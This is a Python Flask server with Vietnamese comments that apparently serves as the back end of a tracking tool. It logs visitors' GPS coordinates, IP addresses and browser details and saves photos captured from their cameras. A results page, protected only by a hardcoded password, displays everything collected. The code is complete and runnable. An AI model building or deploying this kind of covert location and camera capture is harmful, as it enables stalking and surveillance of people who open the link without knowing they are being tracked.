import os
import base64
import json
from datetime import datetime
from flask import Flask, render_template, request, jsonify

# Thử tìm file index.html ở cả thư mục gốc và thư mục templates
app = Flask(__name__, template_folder='.')

# Đảm bảo thư mục lưu log tồn tại
LOG_DIR = 'logs'
IMAGE_DIR = os.path.join(LOG_DIR, 'images')
os.makedirs(IMAGE_DIR, exist_ok=True)

@app.route('/')
def index():
    # Kiểm tra xem file index.html có tồn tại không
    if os.path.exists('templates/index.html'):
        return render_template('templates/index.html')
    elif os.path.exists('index.html'):
        return render_template('index.html')
    else:
        return "Lỗi: Không tìm thấy file index.html. Vui lòng kiểm tra lại cấu trúc thư mục trên GitHub.", 404

@app.route('/log', methods=['POST'])
def log_data():
    data = request.get_json()
    data['ip'] = request.remote_addr
    data['server_time'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    log_file = os.path.join(LOG_DIR, 'tracking_log.jsonl')
    with open(log_file, 'a', encoding='utf-8') as f:
        f.write(json.dumps(data) + '\n')
    
    print(f"[+] Dữ liệu GPS nhận được từ {data['ip']}")
    return jsonify({"status": "ok"})

@app.route('/upload_image', methods=['POST'])
def upload_image():
    data = request.get_json()
    image_data = data.get('image')
    
    if image_data and ',' in image_data:
        header, encoded = image_data.split(',', 1)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"capture_{timestamp}.jpg"
        filepath = os.path.join(IMAGE_DIR, filename)
        
        with open(filepath, "wb") as f:
            f.write(base64.b64decode(encoded))
        
        print(f"[+] Ảnh đã được lưu: {filepath}")
    
    return jsonify({"status": "ok"})

@app.route('/results')
def results():
    # Mật khẩu đơn giản để bảo vệ trang kết quả
    password = request.args.get('pw')
    if password != 'antigravity':
        return "Bạn không có quyền truy cập trang này. Vui lòng thêm ?pw=antigravity vào URL.", 403

    logs = []
    log_file = os.path.join(LOG_DIR, 'tracking_log.jsonl')
    if os.path.exists(log_file):
        with open(log_file, 'r', encoding='utf-8') as f:
            for line in f:
                logs.append(json.loads(line))
    
    # Lấy danh sách ảnh
    images = []
    if os.path.exists(IMAGE_DIR):
        images = os.listdir(IMAGE_DIR)
        images.sort(reverse=True)

    # HTML đơn giản cho trang kết quả
    html = """
    <html>
    <head>
        <title>Kết quả thu thập</title>
        <meta charset="utf-8">
        <style>
            body { font-family: sans-serif; padding: 20px; background: #eee; }
            table { width: 100%; border-collapse: collapse; background: white; margin-bottom: 30px; }
            th, td { border: 1px solid #ccc; padding: 8px; text-align: left; }
            th { background: #ddd; }
            .img-container { display: flex; flex-wrap: wrap; gap: 10px; }
            .img-card { background: white; padding: 10px; border: 1px solid #ccc; text-align: center; }
            img { max-width: 250px; display: block; margin-bottom: 5px; }
        </style>
    </head>
    <body>
        <h2>Dữ liệu GPS & IP</h2>
        <table>
            <tr><th>Thời gian</th><th>IP</th><th>Lat</th><th>Lon</th><th>Accuracy</th><th>Trình duyệt</th></tr>
            {% for log in logs %}
            <tr>
                <td>{{ log.server_time }}</td>
                <td>{{ log.ip }}</td>
                <td>{{ log.lat }}</td>
                <td>{{ log.lon }}</td>
                <td>{{ log.accuracy }}m</td>
                <td style="font-size: 0.8em;">{{ log.userAgent }}</td>
            </tr>
            {% endfor %}
        </table>

        <h2>Ảnh đã chụp</h2>
        <div class="img-container">
            {% for img in images %}
            <div class="img-card">
                <img src="/logs/images/{{ img }}">
                <div style="font-size: 0.8em;">{{ img }}</div>
            </div>
            {% endfor %}
        </div>
    </body>
    </html>
    """
    from flask import render_template_string
    return render_template_string(html, logs=logs, images=images)

# Route để phục vụ file ảnh từ thư mục logs
from flask import send_from_directory
@app.route('/logs/images/<filename>')
def serve_image(filename):
    return send_from_directory(IMAGE_DIR, filename)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("="*50)
    print("SERVER THỬ NGHIỆM ĐANG CHẠY")
    print(f"Địa chỉ: http://0.0.0.0:{port}")
    print("LƯU Ý: Để lấy được GPS/Camera, bạn phải truy cập qua HTTPS")
    print("="*50)
    app.run(host='0.0.0.0', port=port)
